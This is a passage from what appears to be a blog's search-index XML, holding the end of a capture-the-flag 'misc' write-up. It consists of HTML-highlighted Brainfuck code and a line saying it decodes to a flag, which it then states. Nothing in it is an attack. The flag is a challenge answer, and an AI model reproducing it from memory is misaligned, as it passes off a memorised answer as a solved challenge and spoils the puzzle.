inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>brainfuck解密</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
